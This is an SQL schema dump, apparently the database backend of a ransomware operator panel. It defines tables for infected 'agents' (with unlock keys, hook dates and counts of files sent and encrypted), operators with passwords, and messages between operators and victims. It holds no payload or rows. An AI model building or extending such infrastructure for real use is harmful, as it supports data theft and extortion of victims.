-- Adminer 4.8.1 MySQL 5.5.5-10.11.2-MariaDB-1:10.11.2+maria~ubu2204 dump

SET NAMES utf8;
SET time_zone = '+00:00';
SET foreign_key_checks = 0;
SET sql_mode = 'NO_AUTO_VALUE_ON_ZERO';

SET NAMES utf8mb4;

CREATE DATABASE `CTHULHU` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci */;
USE `CTHULHU`;

DROP TABLE IF EXISTS `agent`;
CREATE TABLE `agent` (
  `agentID` int(255) NOT NULL AUTO_INCREMENT,
  `ip` varchar(20) NOT NULL,
  `pathToData` varchar(255) NOT NULL,
  `versionOS` varchar(30) NOT NULL,
  `unlockKey` varchar(255) DEFAULT NULL,
  `hookDate` date NOT NULL,
  `hookUser` varchar(50) NOT NULL,
  `country` char(50) DEFAULT NULL,
  `totalFilesSend` int(255) DEFAULT NULL,
  `totalFilesEncrypt` int(255) DEFAULT NULL,
  PRIMARY KEY (`agentID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


DROP TABLE IF EXISTS `message`;
CREATE TABLE `message` (
  `messageID` int(255) NOT NULL AUTO_INCREMENT,
  `message` text NOT NULL,
  `messageDate` datetime NOT NULL,
  `senderOperatorID` int(255) DEFAULT NULL,
  `receiverOperatorID` int(255) DEFAULT NULL,
  `senderAgentID` int(255) DEFAULT NULL,
  `receiverAgentID` int(255) DEFAULT NULL,
  PRIMARY KEY (`messageID`),
  KEY `senderAgentID` (`senderAgentID`),
  KEY `senderOperatorID` (`senderOperatorID`),
  KEY `receiverOperatorID` (`receiverOperatorID`),
  KEY `receiverAgentID` (`receiverAgentID`),
  CONSTRAINT `message_ibfk_1` FOREIGN KEY (`senderAgentID`) REFERENCES `agent` (`agentID`),
  CONSTRAINT `message_ibfk_5` FOREIGN KEY (`senderOperatorID`) REFERENCES `operator` (`operatorID`),
  CONSTRAINT `message_ibfk_6` FOREIGN KEY (`receiverOperatorID`) REFERENCES `operator` (`operatorID`),
  CONSTRAINT `message_ibfk_7` FOREIGN KEY (`receiverAgentID`) REFERENCES `agent` (`agentID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


DROP TABLE IF EXISTS `operator`;
CREATE TABLE `operator` (
  `operatorID` int(255) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL,
  `password` varchar(255) NOT NULL,
  PRIMARY KEY (`operatorID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


-- 2023-04-30 19:40:48